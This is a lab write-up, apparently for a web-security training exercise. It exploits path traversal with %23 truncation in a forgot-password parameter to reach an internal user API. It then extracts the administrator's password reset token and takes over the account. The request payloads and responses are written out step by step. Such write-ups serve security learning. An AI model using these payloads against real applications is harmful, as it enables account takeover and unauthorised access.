## 1. Initial reconnaissance

Three endpoints detected with parameter input:

`/product`

`/login`

`/forgot-password`

Used Burp Intruder with a list "Fuzzing - path traversal (single file)” → fuzzed `username` with known traversal payloads.

Only `/forgot-password` behaved differently when fuzzed with traversal. Found 500 responses included HTML "Not found" pages, strongly indicating path injection.

![image.png](attachment:b534d38e-beec-46f6-b512-445b5223fa16:image.png)

---

## 2. Testing methodology

Use directory traversal to reach API specification. Initial attempts using:

```jsx
../api
../../api
...
../openapi.json
../../openapi.json
...
../swagger/index.html
../../swagger/index.html
...
```

returned 500 errors with no new information.

![image.png](attachment:6572dbf3-ffd8-469e-9763-77979674dd3c:image.png)

Likely we need to maybe we need to modify paths ending in `%23` to truncate the backend route:

```jsx
../api%23
../../api%23
...
../openapi.json%23
../../openapi.json%23
...
../swagger/index.html%23
../../swagger/index.html%23
...
```

![image.png](attachment:8f171b30-6e08-42d2-aeeb-a47a4173981f:image.png)

We see another result - still 500 status code, but with another length - 762. Here’s what the server responses now:

```jsx
{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```

beautified version:

```jsx
{
  "openapi": "3.0.0",
  "info": {
    "title": "User API",
    "version": "2.0.0"
  },
  "paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
      "get": {
        "tags": [
          "users"
        ],
        "summary": "Find user by username",
        "description": "API Version 1",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "description": "Username",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ]
      }
    }
  }
}
```

Extracted:

```jsx
/api/internal/v1/users/{username}/field/{field}
```

---

## 3. Payload construction

Now we try to discover different fields:

request `csrf=3pRZBisS8d3Z47CBo1Qst21yf4uFMkjU&username=../users/administrator/field/aaa%23` 

response`{"type": "error", "result": "Invalid route. Please refer to the API definition"}` 

![image.png](attachment:dc6302e8-c178-45db-b957-d0665480c1e7:image.png)

When we send `csrf=3pRZBisS8d3Z47CBo1Qst21yf4uFMkjU&username=../users/administrator/field/email%23`  we got `{"result":"*****@normal-user.net","type":"email"}` . So specifying fields work.

Tried API v2 - the same result:

request `csrf=3pRZBisS8d3Z47CBo1Qst21yf4uFMkjU&username=../../v2/users/administrator/field/username%23` 

response `{"type": "error","result": "This version of API only supports the email field for security reasons"}` 

But when specifying explicitly v1, it allows to filter by another fields:

request `csrf=3pRZBisS8d3Z47CBo1Qst21yf4uFMkjU&username=../../v1/users/administrator/field/username%23` 

response `{"type": "username","result": "administrator"}`

Let’s guess reset token field name:

request `csrf=3pRZBisS8d3Z47CBo1Qst21yf4uFMkjU&username=../../v1/users/administrator/field/abc%23`

response `{"type": "error","result": "The provided field name \"abc\" does not exist and cannot be retrieved"}` 

Tried names like "token", "resetToken", "reset", "reset-token" but failed. But we forgot about /static/js/forgotPassword.js web page. Observe this line in the file `window.location.href = '/forgot-password?passwordResetToken=${resetToken}';` This is what we need!

Final exploitation:

request `csrf=3pRZBisS8d3Z47CBo1Qst21yf4uFMkjU&username=../../v1/users/administrator/field/passwordResetToken%23`

response `{"type": "passwordResetToken","result": "vahagz6t5zjur9qcoz1hh84ppdio4v85"}`

![image.png](attachment:6cda41d4-b27b-4625-9f94-f7dc1d8efac6:image.png)

Then go to `/forgot-password?passwordResetToken=vahagz6t5zjur9qcoz1hh84ppdio4v85`, observe new password form

![image.png](attachment:bf7c2f54-8d98-46de-a0a8-ab0b1e04fde0:image.png)

---

## **4. Completing the attack**

1. Change password
2. Log in as administrator with a new password
3. Go to Admin panel and delete **carlos**

![image.png](attachment:c75b2839-f4a4-4b3b-89e8-629c55dfce09:image.png)

---
